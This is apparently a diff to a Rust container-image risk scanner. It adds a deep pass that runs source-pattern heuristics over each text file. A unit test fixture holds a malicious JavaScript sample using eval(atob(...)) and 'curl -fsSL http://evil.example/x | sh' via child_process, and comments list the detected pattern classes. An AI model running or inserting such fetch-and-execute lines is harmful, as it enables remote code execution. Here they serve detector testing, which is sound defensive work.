@@ -1,13 +1,14 @@
-//! First-slice risk scan over a flattened image filesystem.
+//! Risk scan over a flattened image filesystem.
 //!
-//! These checks are intentionally SHALLOW and self-contained — they flag
-//! obviously suspicious *paths* using file location + magic-byte sniffing,
-//! nothing more. They are NOT a substitute for real capability analysis:
-//! deeper per-file / per-package scanning (feeding each captured package to
-//! `aegis-ast` + `aegis-heuristics`) is a deliberate follow-up and is noted
-//! as out of scope in the crate docs.
+//! Two passes live here. [`scan_image_files`] is the SHALLOW, self-contained
+//! path scan — it flags obviously suspicious *paths* using file location +
+//! magic-byte sniffing, nothing more. [`deep_scan_image_files`] is the deeper
+//! pass: it runs the project's `aegis-heuristics` source-pattern detector over
+//! each text/code file and reports the capabilities it emits. Per-file
+//! tree-sitter AST capability scanning (`aegis-ast`) is still a follow-up and
+//! is noted as out of scope in the crate docs.
 //!
-//! Current checks:
+//! Shallow-pass checks:
 //!   1. **Dropper in a world-writable / temp location** — a shell script or
 //!      ELF binary sitting under `tmp/`, `var/tmp/`, `dev/shm/`, or `run/`.
 //!   2. **Hidden executable** — a dotfile (`.foo`) whose bytes are ELF or a
@@ -17,7 +18,17 @@
 //!      `*.dist-info/METADATA`). Informational: marks where the follow-up
 //!      per-package capability scan will attach.
 
+use aegis_domain::Ecosystem;
+use aegis_heuristics::source_patterns::check_source_patterns;
+use aegis_heuristics::NormalizedPackage;
+
 use crate::overlay::ImageFiles;
+
+/// Per-file byte cap for the deep source-pattern pass. Mirrors the Go
+/// scanner's `maxSourceFileBytes` (256 KiB) — keeps work bounded when an
+/// image ships multi-MB minified bundles. The detector caps its own scan at
+/// the same size internally, so truncating here just avoids copying the tail.
+const MAX_SOURCE_FILE_BYTES: usize = 256 * 1024;
 
 /// A single risk observation about one path in the image.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -55,6 +66,57 @@ pub fn scan_image_files(files: &ImageFiles) -> Vec<Finding> {
         }
     }
     out
+}
+
+/// Deeper pass: run the real source-pattern heuristics over each text/code
+/// file extracted from the image and surface the resulting capabilities as
+/// findings. Additive to [`scan_image_files`] — the shallow path checks stay
+/// as-is; this reuses the project's `aegis-heuristics` source-pattern detector
+/// (`curl|sh` shell-fetchers, obfuscated eval/decode payloads, C2/exfil URLs,
+/// known-malware IOC filenames) instead of just sniffing paths.
+///
+/// Each file is scanned in isolation so a capability can be attributed to the
+/// exact path that triggered it. Binary and non-UTF8 files are skipped, and
+/// each file is capped at [`MAX_SOURCE_FILE_BYTES`]; malformed input never
+/// panics — worst case a file is skipped.
+///
+/// Deterministic: input is a `BTreeMap`, so findings come out in path order.
+///
+/// NOTE: this is source-pattern heuristics only. Per-file tree-sitter AST
+/// capability scanning (feeding each captured file to `aegis-ast`) is a
+/// further follow-up and is deliberately out of scope for this slice.
+pub fn deep_scan_image_files(files: &ImageFiles) -> Vec<Finding> {
+    let mut out = Vec::new();
+    for (path, body) in &files.files {
+        let capped = if body.len() > MAX_SOURCE_FILE_BYTES {
+            &body[..MAX_SOURCE_FILE_BYTES]
+        } else {
+            &body[..]
+        };
+        if !looks_textual(capped) {
+            continue;
+        }
+        // The detector dispatches purely on file extension / filename, so the
+        // ecosystem tag is irrelevant here — we scan one path at a time to
+        // keep capability → path attribution exact.
+        let pkg = NormalizedPackage::new("image", Ecosystem::Npm)
+            .with_file(path.clone(), capped.to_vec());
+        for cap in check_source_patterns(&pkg) {
+            out.push(Finding {
+                path: path.clone(),
+                reason: cap.description().to_string(),
+            });
+        }
+    }
+    out
+}
+
+/// Cheap binary sniff: a NUL byte in the (already-capped) prefix means the
+/// file is almost certainly not source text, so skip it. The source-pattern
+/// detector reads bodies via `from_utf8_lossy`, so anything that survives
+/// this check is safe to hand off even if it isn't perfectly valid UTF-8.
+fn looks_textual(body: &[u8]) -> bool {
+    !body.contains(&0)
 }
 
 /// A shell script or native binary in a world-writable / temp dir is a
@@ -253,6 +315,60 @@ mod tests {
         assert!(files.files.contains_key("tmp/x.sh"));
         let findings = scan_image_files(&files);
         assert!(findings.iter().any(|f| f.path == "tmp/x.sh"));
+    }
+
+    #[test]
+    fn deep_scan_flags_source_pattern_capabilities() {
+        // A JS file with an obfuscated eval + a shell-fetcher payload, a JPEG
+        // that happens to carry a NUL byte (binary — must be skipped), and a
+        // clean source file (no findings).
+        let evil_js = br#"
+            const p = eval(atob('cGF5bG9hZA=='));
+            require('child_process').exec('curl -fsSL http://evil.example/x | sh');
+        "#;
+        let binary_blob = b"\xff\xd8\xff\x00eval(atob('x'))"; // NUL -> treated as binary
+        let clean_js = b"export const sum = (a, b) => a + b;";
+
+        let layer = make_tar(&[
+            ("app/index.js", evil_js.as_slice()),
+            ("app/logo.jpg", binary_blob.as_slice()),
+            ("app/util.js", clean_js.as_slice()),
+        ]);
+        let manifest = r#"[{"Layers":["layer.tar"]}]"#;
+        let image = make_image(manifest, &[("layer.tar", &layer)]);
+
+        let files = crate::extract_image_from_bytes(&image).expect("extract");
+        let findings = deep_scan_image_files(&files);
+
+        // The evil JS gets both an obfuscated-payload and a shell-fetcher
+        // finding, attributed to its own path.
+        let js_reasons: Vec<&str> = findings
+            .iter()
+            .filter(|f| f.path == "app/index.js")
+            .map(|f| f.reason.as_str())
+            .collect();
+        assert!(
+            js_reasons
+                .iter()
+                .any(|r| r.contains("decodes-then-executes")),
+            "expected obfuscated-payload finding, got {findings:?}"
+        );
+        assert!(
+            js_reasons
+                .iter()
+                .any(|r| r.contains("download") || r.contains("curl|sh")),
+            "expected shell-fetcher finding, got {findings:?}"
+        );
+
+        // Binary file skipped, clean file produces nothing.
+        assert!(
+            !findings.iter().any(|f| f.path == "app/logo.jpg"),
+            "binary file should be skipped, got {findings:?}"
+        );
+        assert!(
+            !findings.iter().any(|f| f.path == "app/util.js"),
+            "clean source should produce no findings, got {findings:?}"
+        );
     }
 
     #[test]
